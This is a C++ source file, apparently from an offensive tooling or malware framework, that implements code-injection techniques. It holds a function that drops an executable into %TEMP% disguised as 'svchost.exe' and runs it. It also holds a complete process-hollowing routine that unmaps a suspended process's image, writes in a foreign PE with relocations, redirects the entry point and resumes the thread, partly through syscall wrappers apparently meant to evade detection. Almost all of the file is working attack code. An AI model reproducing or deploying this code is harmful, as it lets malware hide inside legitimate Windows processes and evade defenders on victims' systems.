#include "core/technique.hpp"

namespace Technique::Injection
{
    BOOL DirectExecution(
        Procs::PPROCS       pProcs,
        std::vector<BYTE>   bytes
    ) {
         // Set the temp file path
        std::wstring wExeFileName = L"svchost.exe"; // Impersonate the file name.
        std::wstring wExePath = System::Env::EnvStringsGet(pProcs, L"%TEMP%") + L"\\" + wExeFileName;

        // Write PE file
        if (!System::Fs::FileWrite(pProcs, wExePath, bytes))
        {
            return FALSE;
        }

        return System::Process::ExecuteFile(pProcs, wExePath);
    }

    // Reference:
    // https://www.ired.team/offensive-security/code-injection-process-injection/pe-injection-executing-pes-inside-remote-processes
    BOOL PEInjection(
        Procs::PPROCS pProcs
    ) {
        // TODO: Implement
        return FALSE;
    }

    // References:
    // https://github.com/NATsCodes/ProcessHollowing/blob/master/Process%20Hollowing.cpp
    BOOL ProcessHollowing(
        Procs::PPROCS       pProcs,
        LPVOID              lpBuffer,
        const std::wstring  &wTargetProcess
    ) {
        NTSTATUS status;

        // Read source EXE file
        LPBYTE lpbBuffer = (LPBYTE)lpBuffer;

        // Create destination (suspended) process to be hollowed
        LPSTARTUPINFOW lpStartupInfo = new STARTUPINFOW();
        PROCESS_INFORMATION pi;

        if (!CreateProcessW(
            nullptr,
            const_cast<LPWSTR>(wTargetProcess.c_str()),
            nullptr,
            nullptr,
            FALSE,
            CREATE_SUSPENDED,
            nullptr,
            nullptr,
            lpStartupInfo,
            &pi
        )) {
            return FALSE;
        }

        HANDLE hDestProcess = pi.hProcess;
        HANDLE hDestThread = pi.hThread;

        // Get all register values
        LPCONTEXT lpCtx = new CONTEXT();
        lpCtx->ContextFlags = CONTEXT_FULL;
        status = CallSysInvoke(
            &pProcs->sysNtGetContextThread,
            pProcs->lpNtGetContextThread,
            hDestThread,
            lpCtx
        );
        if (status != STATUS_SUCCESS)
        {
            delete lpCtx;
            return FALSE;
        }

        // Get destination ImageBaseAddress
        PVOID pDestImageBase = 0;
        SIZE_T dwBytesRead = 0;

        #ifdef _WIN64
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hDestProcess,
                (PVOID)(lpCtx->Rdx + (sizeof(SIZE_T) * 2)), // sizeof(SIZE_T) = 16
                &pDestImageBase,
                sizeof(PVOID), // 8
                &dwBytesRead
            )) {
                delete lpCtx;
                return FALSE;
            }
        #else
            if (!System::Process::VirtualMemoryRead(
                pProcs,
                hDestProcess,
                (PVOID)(lpCtx->Ebx + 8),
                &pDestImageBase,
                sizeof(PVOID), // 4
                &dwBytesRead
            )) {
                delete lpCtx;
                return FALSE;
            }
        #endif

        // Unmap all the sections.
        status = CallSysInvoke(
            &pProcs->sysNtUnmapViewOfSection,
            pProcs->lpNtUnmapViewOfSection,
            hDestProcess,
            pDestImageBase
        );
        if (status != STATUS_SUCCESS)
        {
            delete lpCtx;
            return FALSE;
        }

        // Get source image size
        PIMAGE_DOS_HEADER pSrcDosHeader = (PIMAGE_DOS_HEADER)lpBuffer;
        PIMAGE_NT_HEADERS pSrcNtHeaders = (PIMAGE_NT_HEADERS)(lpbBuffer + pSrcDosHeader->e_lfanew);
        SIZE_T dwSrcImageSize = pSrcNtHeaders->OptionalHeader.SizeOfImage;

        // Allocate new memory in destination image for the source image
        LPVOID mem = System::Process::VirtualMemoryAllocate(
            pProcs,
            hDestProcess,
            pDestImageBase,
            dwSrcImageSize,
            MEM_COMMIT | MEM_RESERVE,
            PAGE_EXECUTE_READWRITE
        );

        // Get offset between the source image base address and the destination image base address.
        #ifdef _WIN64
            DWORD64 dwImageBaseOffset = (DWORD64)pDestImageBase - pSrcNtHeaders->OptionalHeader.ImageBase;
            pSrcNtHeaders->OptionalHeader.ImageBase = (DWORD64)pDestImageBase;
        #else
            DWORD dwImageBaseOffset = (DWORD)pDestImageBase - pSrcNtHeaders->OptionalHeader.ImageBase;
            pSrcNtHeaders->OptionalHeader.ImageBase = (DWORD)pDestImageBase;
        #endif

        // Set source image base to destination image base and copy the source image headers to the destination image.
        if (!System::Process::VirtualMemoryWrite(
            pProcs,
            hDestProcess,
            pDestImageBase,
            lpBuffer,
            pSrcNtHeaders->OptionalHeader.SizeOfHeaders,
            nullptr
        )) {
            delete lpCtx;
            return FALSE;
        }

        // Copy source image sections to destination
        PIMAGE_SECTION_HEADER pSecHeader;
        for (int i = 0; i < pSrcNtHeaders->FileHeader.NumberOfSections; i++)
        {
            pSecHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pSrcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
            if (!System::Process::VirtualMemoryWrite(
                pProcs,
                hDestProcess,
                (PVOID)((LPBYTE)mem + pSecHeader->VirtualAddress),
                (PVOID)((LPBYTE)lpBuffer + pSecHeader->PointerToRawData),
                pSecHeader->SizeOfRawData,
                nullptr
            )) {
                // Error writing section.
            }
        }

        if (dwImageBaseOffset < 0)
        {
            delete lpCtx;
            return FALSE;
        }

        // Patch the binary with relocations.
        for (int i = 0; i < pSrcNtHeaders->FileHeader.NumberOfSections; i++)
        {
            pSecHeader = (PIMAGE_SECTION_HEADER)((LPBYTE)lpBuffer + pSrcDosHeader->e_lfanew + sizeof(IMAGE_NT_HEADERS) + (i * sizeof(IMAGE_SECTION_HEADER)));
            
            char relocSectionName[] = ".reloc";
            if (memcmp(pSecHeader->Name, relocSectionName, strlen(relocSectionName)) != 0)
            {
                continue;
            }

            DWORD dwRelocAddr = pSecHeader->PointerToRawData;
            IMAGE_DATA_DIRECTORY relocTable = pSrcNtHeaders->OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_BASERELOC];
            DWORD dwRelocOffset = 0;

            while (dwRelocOffset < relocTable.Size)
            {
                PBASE_RELOCATION_BLOCK pRelocBlock = (PBASE_RELOCATION_BLOCK)&lpbBuffer[dwRelocAddr + dwRelocOffset];
                dwRelocOffset += sizeof(BASE_RELOCATION_BLOCK);

                DWORD dwRelocEntryCount = (pRelocBlock->BlockSize - sizeof(BASE_RELOCATION_BLOCK)) / sizeof(BASE_RELOCATION_ENTRY);
                PBASE_RELOCATION_ENTRY pRelocEntries = (PBASE_RELOCATION_ENTRY)&lpbBuffer[dwRelocAddr + dwRelocOffset];

                for (int y = 0; y < dwRelocEntryCount; y++)
                {
                    dwRelocOffset += sizeof(BASE_RELOCATION_ENTRY);
                    
                    if (pRelocEntries[y].Type == 0)
                    {
                        continue;
                    }

                    DWORD dwPatchAddr = pRelocBlock->PageAddress + pRelocEntries[y].Offset;

                    #ifdef _WIN64
                        DWORD64 dwPatchedBufferSize = 0;
                        if (!System::Process::VirtualMemoryRead(
                            pProcs,
                            hDestProcess,
                            (PVOID)((DWORD64)pDestImageBase + dwPatchAddr),
                            &dwPatchedBufferSize,
                            sizeof(PVOID),
                            nullptr
                        )) {
                            delete lpCtx;
                            return FALSE;
                        }
                        dwPatchedBufferSize += dwImageBaseOffset;

                        if (!System::Process::VirtualMemoryWrite(
                            pProcs,
                            hDestProcess,
                            (PVOID)((DWORD64)pDestImageBase + dwPatchAddr),
                            &dwPatchedBufferSize,
                            sizeof(PVOID),
                            nullptr
                        )) {
                            delete lpCtx;
                            return FALSE;
                        }
                    #else
                        DWORD dwPatchedBufferSize = 0;
                        if (!System::Process::VirtualMemoryRead(
                            pProcs,
                            hDestProcess,
                            (PVOID)((DWORD)pDestImageBase + dwPatchAddr),
                            &dwPatchedBufferSize,
                            sizeof(PVOID),
                            nullptr
                        )) {
                            delete lpCtx;
                            return FALSE;
                        }
                        dwPatchedBufferSize += dwImageBaseOffset;

                        if (!System::Process::VirtualMemoryWrite(
                            pProcs,
                            hDestProcess,
                            (PVOID)((DWORD)pDestImageBase + dwPatchAddr),
                            &dwPatchedBufferSize,
                            sizeof(PVOID),
                            nullptr
                        )) {
                            delete lpCtx;
                            return FALSE;
                        }
                    #endif
                }
            }
        }

        // Write the new image base address
        #ifdef _WIN64
            if (!System::Process::VirtualMemoryWrite(
                pProcs,
                hDestProcess,
                (PVOID)(lpCtx->Rdx + (sizeof(SIZE_T) * 2)),
                &pSrcNtHeaders->OptionalHeader.ImageBase,
                sizeof(PVOID),
                nullptr
            )) {
                delete lpCtx;
                return FALSE;
            }
            DWORD64 dwPatchedEntryPoint = (DWORD64)((LPBYTE)mem + pSrcNtHeaders->OptionalHeader.AddressOfEntryPoint);
            lpCtx->Rcx = dwPatchedEntryPoint;
        #else
             if (!System::Process::VirtualMemoryWrite(
                pProcs,
                hDestProcess,
                (PVOID)(lpCtx->Ebx + 8),
                &pSrcNtHeaders->OptionalHeader.ImageBase,
                sizeof(PVOID),
                nullptr
            )) {
                delete lpCtx;
                return FALSE;
            }
            DWORD dwPatchedEntryPoint = (DWORD)((LPBYTE)mem + pSrcNtHeaders->OptionalHeader.AddressOfEntryPoint);
            lpCtx->Eax = dwPatchedEntryPoint;
        #endif

        // status = CallSysInvoke(
        //     &pProcs->sysNtSetContextThread,
        //     pProcs->lpNtSetContextThread,
        //     hDestThread,
        //     lpCtx
        // );
        // if (status != STATUS_SUCCESS)
        // {
        //     Stdout::DisplayMessageBoxW(Utils::Convert::DWORDToWstring(status).c_str(), L"NtSetContextThread");
        //     delete lpCtx;
        //     return FALSE;
        // }
        if (!SetThreadContext(hDestThread, lpCtx))
        {
            delete lpCtx;
            return FALSE;
        }

        status = CallSysInvoke(
            &pProcs->sysNtResumeThread,
            pProcs->lpNtResumeThread,
            hDestThread,
            nullptr
        );
        if (status != STATUS_SUCCESS)
        {
            delete lpCtx;
            return FALSE;
        }

        delete lpCtx;

        return TRUE;
    }
}